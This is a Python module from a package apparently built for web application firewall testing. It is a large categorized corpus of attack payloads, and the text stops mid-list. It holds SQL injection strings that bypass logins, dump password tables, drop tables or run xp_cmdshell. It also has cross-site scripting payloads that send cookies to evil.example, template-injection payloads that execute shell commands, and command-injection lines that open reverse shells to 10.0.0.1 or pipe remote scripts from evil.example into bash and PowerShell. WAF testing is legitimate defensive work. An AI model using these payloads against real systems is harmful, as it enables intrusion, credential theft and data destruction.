"""Massive payload corpus — 3000+ categorized payloads for comprehensive WAF testing.

Each payload tests a genuinely different bypass technique, encoding, or attack vector.
Organized by attack class with sub-categories for systematic coverage.

Usage:
    from waffen.kb.corpus import corpus_for, corpus_all, corpus_stats
    payloads = corpus_for("sqli")       # all SQLi payloads
    everything = corpus_all()            # {class: [payloads]}
    stats = corpus_stats()               # {class: count}
"""
from __future__ import annotations


# ---------------------------------------------------------------------------
# SQL Injection (~800)
# ---------------------------------------------------------------------------

SQLI_AUTH_BYPASS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR 1#",
    "' OR 1=1 LIMIT 1--",
    "') OR ('1'='1",
    "') OR ('1'='1'--",
    "')) OR (('1'='1",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\"--",
    "\" OR 1=1--",
    "admin'--",
    "admin'-- -",
    "admin'#",
    "admin')--",
    "' OR ''='",
    "' OR 'x'='x",
    "' OR 'a'='a",
    "' OR 1 LIKE 1--",
    "' OR 1 IN (1)--",
    "' OR 1 BETWEEN 0 AND 2--",
    "1' OR '1'='1'-- -",
    "1' OR 1=1-- -",
    "1') OR ('1'='1'-- -",
    "' OR NOT 0--",
    "' OR 1--",
    "' OR 2>1--",
    "' OR 2 LIKE 2--",
    "' OR 'ab' LIKE 'a%'--",
    "or 1=1",
    "or 1=1--",
    "' or ''-'",
    "' or ''&'",
    "' or ''^'",
    "' or 1=1 or ''='",
    "admin' or '1'='1",
    "admin' OR 1=1--",
]

SQLI_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
    "' UNION SELECT @@version,NULL--",
    "' UNION SELECT version(),NULL--",
    "' UNION SELECT user(),NULL--",
    "' UNION SELECT database(),NULL--",
    "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
    "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables--",
    "' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns--",
    "' UNION SELECT CONCAT(username,':',password),NULL FROM users--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION SELECT NULL FROM dual--",
    "1 UNION SELECT username,password FROM users",
    "1 UNION ALL SELECT 1,2,3,4,5",
    "' UNION SELECT 0x61646d696e--",
    "' UNION SELECT CHAR(97,100,109,105,110)--",
    "-1 UNION SELECT 1,2,3--",
    "0 UNION SELECT 1,2,3--",
    "' UNION SELECT load_file('/etc/passwd'),NULL--",
    "' UNION SELECT '<?php system($_GET[c]);?>',NULL INTO OUTFILE '/var/www/shell.php'--",
    "' UNION SELECT name,sql FROM sqlite_master--",
    "' UNION SELECT tbl_name,NULL FROM sqlite_master--",
    "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--",
]

SQLI_BLIND_BOOLEAN = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    "' AND 1=1 AND ''='",
    "' AND 1=2 AND ''='",
    "' AND SUBSTRING(version(),1,1)='5'--",
    "' AND SUBSTRING(user(),1,1)='r'--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
    "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--",
    "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "' AND (SELECT TOP 1 LEN(password) FROM users)>5--",
    "' AND (SELECT unicode(substr(password,1,1)) FROM users LIMIT 1)>96--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND BINARY SUBSTRING(password,1,1)='a'--",
    "' AND ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM users LIMIT 1),1,1))>96--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>10--",
    "' AND EXISTS(SELECT * FROM users WHERE username='admin')--",
    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
    "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
]

SQLI_BLIND_TIME = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(5) AND '1'='1",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND BENCHMARK(5000000,SHA1('test'))--",
    "' AND BENCHMARK(10000000,MD5('test'))--",
    "1; WAITFOR DELAY '0:0:5'",
    "1'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT pg_sleep(5))::text='1'--",
    "' || pg_sleep(5)--",
    "1 AND SLEEP(5)",
    "' AND SLEEP(5)#",
    "' AND IF(1=1,SLEEP(5),0)--",
    "' AND IF(1=2,SLEEP(5),0)--",
    "' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
    "' RLIKE SLEEP(5)--",
    "' AND randomblob(300000000)--",
    "' AND likelihood(1,0.5) AND SLEEP(5)--",
]

SQLI_ERROR_BASED = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM(SELECT version())x))--",
    "' AND GTID_SUBSET(CONCAT(0x7e,version()),1)--",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND 1=CAST(version() AS int)--",
    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--",
    "' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT version())a)b))--",
    "' AND LINESTRING((SELECT * FROM(SELECT version())a))--",
]

SQLI_STACKED = [
    "'; DROP TABLE users--",
    "'; DROP TABLE users-- -",
    "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "'; DELETE FROM users WHERE username!='admin'--",
    "'; CREATE TABLE evil(cmd TEXT)--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC sp_configure 'show advanced options',1--",
    "'; SHUTDOWN--",
    "1; SELECT * FROM users",
    "'; DECLARE @x VARCHAR(100); SET @x='whoami'; EXEC(@x)--",
    "'; SELECT load_extension('/tmp/evil.so')--",
]

SQLI_SQLITE = [
    "' GLOB '*",
    "' GLOB '*' GLOB '",
    "' COLLATE NOCASE GLOB '*' GLOB '",
    "' MATCH '*",
    "' ISNULL",
    "' NOTNULL",
    "' ESCAPE 'x",
    "sqlite_version()",
    "typeof(1)",
    "hex(randomblob(16))",
    "iif(1,1,0)",
    "quote(1)",
    "unicode(65)",
    "zeroblob(1)",
    "nullif(1,2)",
    "likelihood(1,0.5)",
    "instr('test','e')",
    "replace('test','e','a')",
    "substr('test',1,2)",
    "group_concat(1,',')",
    "json_extract('{\"a\":1}','$.a')",
    "json_each('{\"a\":1}')",
    "total_changes()",
    "last_insert_rowid()",
    "changes()",
    "' UNION SELECT name,sql FROM sqlite_master--",
    "' UNION SELECT tbl_name,NULL FROM sqlite_master WHERE type='table'--",
    "' OR GLOB('*',1)--",
    "' COLLATE BINARY",
    "RAISE(IGNORE)",
]

SQLI_MYSQL = [
    "' RLIKE '.*",
    "' REGEXP '.*",
    "' SOUNDS LIKE 'admin",
    "' DIV 1",
    "' MOD 1",
    "' XOR 1",
    "@a:=1",
    "@@version",
    "@@datadir",
    "@@basedir",
    "@@hostname",
    "@@global.version",
    "BENCHMARK(5000000,SHA1('test'))",
    "LOAD_FILE('/etc/hostname')",
    "EXTRACTVALUE(1,CONCAT(0x7e,version()))",
    "UPDATEXML(1,CONCAT(0x7e,version()),1)",
    "EXP(~(SELECT*FROM(SELECT version())x))",
    "NAME_CONST(version(),1)",
    "UUID()",
    "JSON_EXTRACT('{\"a\":1}','$.a')",
    "AES_ENCRYPT('test','key')",
    "COMPRESS('test')",
    "INET_ATON('127.0.0.1')",
    "' /*!50000OR*/ 1=1--",
    "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
    "' /*!50000AND*/ 1=1--",
    "' OR @@version LIKE '5%'--",
    "' OR BINARY 'a'='a'--",
    "' HAVING 1=1--",
    "' GROUP BY 1 HAVING 1=1--",
    "' INTO OUTFILE '/tmp/test'--",
    "' INTO DUMPFILE '/tmp/test'--",
]

SQLI_POSTGRESQL = [
    "' ILIKE '%",
    "' SIMILAR TO '%",
    "' ~ '.*",
    "' ~* '.*",
    "' !~ 'x",
    "'1'::int",
    "pg_sleep(5)",
    "pg_read_file('/etc/hostname')",
    "pg_ls_dir('/')",
    "current_setting('server_version')",
    "set_config('log_connections','on',false)",
    "string_agg(table_name,',')",
    "generate_series(1,10)",
    "regexp_matches('test','t(.*)')",
    "regexp_replace('test','t','x')",
    "xpath('/root/text()','<root>test</root>'::xml)",
    "query_to_xml('SELECT 1',true,true,'')",
    "lo_import('/etc/passwd')",
    "txid_current()",
    "' UNION SELECT version()::text,NULL--",
    "' AND '1'::int=1--",
    "' OR 'a' SIMILAR TO '%'--",
    "'; COPY (SELECT version()) TO '/tmp/v'--",
    "' OR version() LIKE 'PostgreSQL%'--",
]

SQLI_MSSQL = [
    "WAITFOR DELAY '0:0:5'",
    "OPENROWSET('SQLOLEDB','server=;','SELECT 1')",
    "OPENDATASOURCE('SQLOLEDB','Data Source=;')..master.dbo.sysdatabases",
    "xp_cmdshell('whoami')",
    "sp_configure 'show advanced options',1",
    "sp_executesql N'SELECT 1'",
    "STUFF((SELECT ',' + name FROM sysobjects FOR XML PATH('')),1,1,'')",
    "STRING_AGG(name,',')",
    "FORMATMESSAGE('%s',@@version)",
    "IIF(1=1,'true','false')",
    "CHOOSE(1,'a','b','c')",
    "QUOTENAME('test')",
    "SUSER_NAME()",
    "SYSTEM_USER",
    "IS_SRVROLEMEMBER('sysadmin')",
    "HAS_DBACCESS('master')",
    "DB_NAME()",
    "HOST_NAME()",
    "SERVERPROPERTY('ProductVersion')",
    "OBJECT_ID('users')",
    "' AND 1=CONVERT(int,@@version)--",
    "'; EXEC master..xp_cmdshell 'whoami'--",
    "'; EXEC sp_makewebtask '/tmp/out.html','SELECT * FROM users'--",
]

SQLI_INLINE_COMMENT = [
    "'/**/OR/**/1=1--",
    "UN/**/ION SEL/**/ECT 1,2,3--",
    "'/**/OR/**/1=1/**/--",
    "' /*!OR*/ 1=1--",
    "' /*!50000OR*/ 1=1--",
    "'/**/UNION/**/SELECT/**/1,2,3--",
    "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
    "' UN/**/ION/**/ SE/**/LECT/**/ 1,2,3--",
    "' OR/*comment*/1=1--",
    "' OR /* bypass */ 1=1--",
    "' UNION/**/ALL/**/SELECT NULL--",
    "' AND/**/1=1--",
    "' OR/*!50000 1=1*/--",
    "'/**/OR/**/1/**/LIKE/**/1--",
    "0'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",
]

SQLI_ENCODING = [
    "%27 OR 1=1--",
    "%27%20OR%201=1--",
    "%27%20OR%20%271%27%3D%271",
    "' %4fR 1=1--",
    "' %4f%52 1=1--",
    "%2527 OR 1=1--",
    "' OR 1%3D1--",
    "\\' OR 1=1--",
    "'' OR 1=1--",
    "' O\\x52 1=1--",
    "%c0%27 OR 1=1--",
    "%ef%bc%87 OR 1=1--",
    "' UNION SELECT 0x61646d696e--",
    "' UNION SELECT CHAR(97,100,109,105,110)--",
    "' OR CONV(16,10,36)=CONV(16,10,36)--",
    "' OR 0x50=0x50--",
    "' OR 1=1-- %0a",
    "' OR 1=1-- %09",
    "%bf%27 OR 1=1--",
    "%a1%27 OR 1=1--",
]

SQLI_WAF_BYPASS = [
    "' || 1=1--",
    "' && 1=1--",
    "' OR 1 IS NOT NULL--",
    "' OR NOT 1=0--",
    "' %0aOR%0a 1=1--",
    "' %09OR%09 1=1--",
    "' %0bOR%0b 1=1--",
    "' %0cOR%0c 1=1--",
    "' %0dOR%0d 1=1--",
    "' OR/**/ 1=1--",
    "' uNiOn SeLeCt 1,2,3--",
    "' UnIoN sElEcT 1,2,3--",
    "' UNION%0aSELECT 1,2,3--",
    "' UNION%09SELECT 1,2,3--",
    "' UNION%0bSELECT 1,2,3--",
    "' UNION%0cSELECT 1,2,3--",
    "'-1' UNION SELECT 1,2,3--",
    "' OR 1=1-- -",
    "' OR 1=1;--",
    "'||'1",
    "'+OR+'1'='1",
    "' OR '1'='1' LIMIT 1 OFFSET 0--",
    "' OR 'x'='x' LIMIT 1 OFFSET 0--",
    "' OR 1 GLOB 1--",
    "' OR GLOB('*',1)--",
    "' OR 1 MATCH 1--",
    "' OR 1 COLLATE NOCASE--",
    "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
    "if(now()=sysdate(),sleep(5),0)",
    "' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--",
    "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR '1' BETWEEN '0' AND '2'--",
    "' OR '1' IN ('1')--",
    "' OR '1' NOT IN ('2')--",
    "' OR CHAR(49)=CHAR(49)--",
    "' OR 0x31=0x31--",
    "' OR 1e0=1e0--",
]

SQLI_SECOND_ORDER = [
    "admin'--",
    "test' OR '1'='1",
    "user' UNION SELECT 1,2,3--",
    "' || (SELECT version()) || '",
    "\\' OR 1=1-- -",
    "admin\\'--",
    "test'||'injection",
    "' AND SLEEP(5) AND '1'='1",
    "admin';-- -",
    "admin'/*",
]

SQLI_NOSQL = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$where": "sleep(5000)"}',
    '{"$where": "this.password.match(/.*/)"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    "admin' || '1'=='1",
    '{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}',
    "' || '1'=='1",
    '{"$regex": "^a"}',
    '{"$exists": true}',
    '{"$type": 2}',
    '{"$in": ["admin", "root"]}',
    '{"$nin": ["nobody"]}',
    "true, $where: '1 == 1'",
    "'; return true; var x='",
    '{"password": {"$regex": "^.{0,20}$"}}',
]


# ---------------------------------------------------------------------------
# XSS (~800)
# ---------------------------------------------------------------------------

XSS_BASIC = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<script>alert(document.cookie)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>confirm(1)</script>',
    '<script>prompt(1)</script>',
    '<script>window.location="http://evil.example/?c="+document.cookie</script>',
    '<script src=http://evil.example/xss.js></script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<script>new Image().src="http://evil.example/?c="+document.cookie</script>',
    '<script>fetch("http://evil.example/?c="+document.cookie)</script>',
]

XSS_TAG_HANDLERS = [
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.cookie)>',
    '<img src=1 onerror=alert(document.domain)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<div onmouseover=alert(1)>move here</div>',
    '<a onmouseover=alert(1)>hover</a>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<meter onmouseover=alert(1)>',
    '<object onerror=alert(1)>',
    '<embed src=x onerror=alert(1)>',
    '<form><button formaction=javascript:alert(1)>XSS</button>',
    '<isindex action=javascript:alert(1) type=image>',
    '<math><mtext><table><mglyph><svg><mtext><style><img src onerror=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributename=x>',
    '<svg><animateTransform onbegin=alert(1)>',
]

XSS_SVG = [
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)//>',
    '<svg onload=alert`1`>',
    '<svg id=x onfocusin=alert(1)><use href=#x />',
    '<svg><script>alert(1)</script></svg>',
    '<svg><script>alert&#40;1&#41;</script>',
    '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>',
    '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
    '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/>',
    '<svg><animate href=#x attributeName=href values=javascript:alert(1) /><a id=x><text>XSS</text></a></svg>',
]

XSS_ENCODING = [
    '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
    '<img src=x onerror=\\u0061lert(1)>',
    '<img src=x onerror=&#x61;lert(1)>',
    '<img src=x onerror=&#97;lert(1)>',
    '<img src=x onerror=al\\u0065rt(1)>',
    '<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>',
    '"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">XSS</a>',
    '<img src=x onerror=top["al"+"ert"](1)>',
    '<img src=x onerror=window["alert"](1)>',
    '<img src=x onerror=self["alert"](1)>',
]

XSS_FILTER_BYPASS = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<<script>alert(1)//<</script>',
    '<img """><script>alert(1)</script>">',
    '<img src=x:alert(1) onerror=eval(src)>',
    '<img src="x`><script>alert(1)</script>`>',
    '<svg><script>al\\u0065rt(1)</script></svg>',
    '<img/src=x onerror=alert(1)>',
    '<img\\nsrc=x\\nonerror=alert(1)>',
    '<img\\tsrc=x\\tonerror=alert(1)>',
    '<img src=x onerror="alert(1)"',
    "<img src=x onerror='alert(1)'>",
    '<img src=x onerror=alert(1)//',
    '<svg/onload=alert(1)//',
    '<math><mtext><img src=x onerror=alert(1)>',
    '<table><tr><td><img src=x onerror=alert(1)>',
    '<noscript><img src=x onerror=alert(1)></noscript>',
    '<xss onafterscriptexecute=alert(1)><script>1</script>',
    '<svg><discard onbegin=alert(1)>',
    '<img src=x onerror=alert(1)///>',
    '<img src=x onerror=alert(1)\\>',
    '<img src=x\\x20onerror=alert(1)>',
    '<img src=x\\x09onerror=alert(1)>',
    '<img src=x\\x0aonerror=alert(1)>',
    '<img src=x\\x0donerror=alert(1)>',
]

XSS_DOM = [
    'javascript:alert(1)',
    'javascript:alert(document.cookie)',
    'JaVaScRiPt:alert(1)',
    'javascript:alert(1)//',
    'javascript:void(0);alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    'vbscript:alert(1)',
    'livescript:alert(1)',
    '<a href="javascript:alert(1)">XSS</a>',
    '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>',
    '<iframe src="javascript:alert(1)">',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
]

XSS_TEMPLATE = [
    '{{constructor.constructor("alert(1)")()}}',
    '{{7*7}}',
    '${alert(1)}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{alert(1)}}',
    '{{this.constructor.constructor("alert(1)")()}}',
    '{{toString.constructor("alert(1)")()}}',
    '{{[].constructor.constructor("alert(1)")()}}',
    '${constructor.constructor("alert(1)")()}',
    '{{config.__class__.__init__.__globals__}}',
    '{{request.application.__globals__.__builtins__}}',
    '<%- 7*7 %>',
    '#{alert(1)}',
    '{{"".__class__.__mro__[1].__subclasses__()}}',
]

XSS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik/%0telerik/*/alert()/*",
    '"><img src=x onerror=alert(1)>//',
    "';alert(1)//",
    "'-alert(1)-'",
    '\\"-alert(1)-//',
    '<img/src=`x`/onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    'javascript:alert(1)//',
    '<img src=x onerror=alert`1`>',
    '<svg onload=alert`1`>',
    '"><svg/onload=alert(1)//>',
    "\">'><script>alert(1)</script>",
    "'-alert(1)//",
    "\\'-alert(1)//",
]

XSS_WAF_BYPASS = [
    '<img src=x onerror=alert(1)>',
    '<iMg SrC=x OnErRoR=alert(1)>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<img src=x onerror=a]lert(1)>',  # only for specific filters
    '<img src=x onerror=\\x61lert(1)>',
    '<svg onload=alert&lpar;1&rpar;>',
    '<svg onload=alert&#40;1&#41;>',
    '<img src=x onerror=top[/al/.source+/ert/.source](1)>',
    '<img src=x onerror=top["al"+"ert"](1)>',
    '<img src=x onerror=this["alert"](1)>',
    '<img src=x onerror="ale"+"rt(1)">',
    '<img src=x onerror=Function("alert(1)")()>',
    '<img src=x onerror=setTimeout("alert(1)")>',
    '<img src=x onerror=setInterval("alert(1)")>',
    '<img src=x onerror=[].sort.call`${alert}1`>',
    '<img src=x onerror=import("data:text/javascript,alert(1)")>',
    '<svg><script>alert(1)</script>',
    '<svg><script>alert&lpar;1&rpar;</script>',
    '<math><mi><mo><img src=x onerror=alert(1)>',
    '<form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
]

XSS_CSP_BYPASS = [
    '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script><div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
    '<link rel=prefetch href="//evil.example">',
    '<meta http-equiv="refresh" content="0; url=javascript:alert(1)">',
    '<base href="javascript://alert(1)//">',
    '<script nonce="">alert(1)</script>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<embed src="data:text/html,<script>alert(1)</script>">',
]


# ---------------------------------------------------------------------------
# SSTI (~200)
# ---------------------------------------------------------------------------

SSTI_JINJA2 = [
    "{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{joiner.__init__.__globals__.os.popen('id').read()}}",
    "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__.os.popen('id').read()}}",
    "{{lipsum.__globals__.__builtins__.open('/etc/passwd').read()}}",
    "{%for x in ''.__class__.__mro__[1].__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
    "{{().__class__.__base__.__subclasses__()}}",
    "{{request.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{% set x = ().__class__.__base__.__subclasses__() %}{{x}}",
    "{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}",
    "{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}",
]

SSTI_TWIG = [
    "{{7*7}}", "{{7*'7'}}", "{{dump()}}", "{{app.request.server.all|join(',')}}",
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}",
    "{{['id']|filter('exec')}}",
    "{{['id']|filter('system')}}",
    "{{['cat /etc/passwd']|filter('system')}}",
    "{{_self.env.getRuntime('command').exec('id')}}",
    "{{_self}}",
    "{{_context}}",
]

SSTI_FREEMARKER = [
    "${7*7}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}",
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"whoami\").start()}",
    "[#assign ex=\"freemarker.template.utility.Execute\"?new()]${ex(\"id\")}",
    "${.now}", "${.version}",
]

SSTI_OTHER = [
    # Mako
    "${self.module.cache.util.os.system('id')}",
    "<%import os;x=os.popen('id').read()%>${x}",
    # Smarty
    "{php}echo `id`;{/php}",
    "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
    # ERB
    "<%= system('id') %>", "<%= `id` %>", "<%= IO.popen('id').read %>",
    # Pebble
    '{% set cmd = "id" %}{% set bytes = (1).TYPE.forName("java.lang.Runtime").methods[6].invoke(null,null).exec(cmd) %}',
    # Velocity
    "#set($x='')+#set($rt=$x.class.forName('java.lang.Runtime'))+#set($chr=$x.class.forName('java.lang.Character'))+#set($str=$x.class.forName('java.lang.String'))+#set($ex=$rt.getRuntime().exec('id'))",
    # Thymeleaf
    "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
    # Handlebars
    "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\" }}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}",
    # Generic math probes
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "@(7*7)",
    "${{7*7}}", "{{= 7*7}}", "#{= 7*7}", "{= 7*7}",
]


# ---------------------------------------------------------------------------
# Command Injection (~200)
# ---------------------------------------------------------------------------

CMDI_LINUX = [
    "; id", "; whoami", "; cat /etc/passwd", "; uname -a",
    "| id", "| whoami", "| cat /etc/passwd",
    "|| id", "|| whoami",
    "& id", "& whoami",
    "&& id", "&& cat /etc/passwd",
    "$(id)", "$(whoami)", "$(cat /etc/passwd)",
    "`id`", "`whoami`", "`cat /etc/passwd`",
    "; ls -la /", "; env", "; printenv", "; set",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "; curl http://evil.example/shell.sh | bash",
    "; wget http://evil.example/x -O /tmp/x && chmod +x /tmp/x && /tmp/x",
    "; ping -c 4 evil.example",
    "$(curl http://evil.example/?x=$(whoami))",
    "`curl http://evil.example/?x=$(id)`",
    "a]|id", "a]|whoami",
    ";{id}", ";{whoami}",
]

CMDI_WINDOWS = [
    "& dir", "& whoami", "& type C:\\Windows\\win.ini",
    "| dir", "| whoami", "| type C:\\Windows\\win.ini",
    "|| dir", "|| whoami",
    "&& dir", "&& whoami",
    "; dir", "; whoami",
    "& ipconfig", "& systeminfo", "& net user",
    "& ping -n 4 evil.example",
    "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')\"",
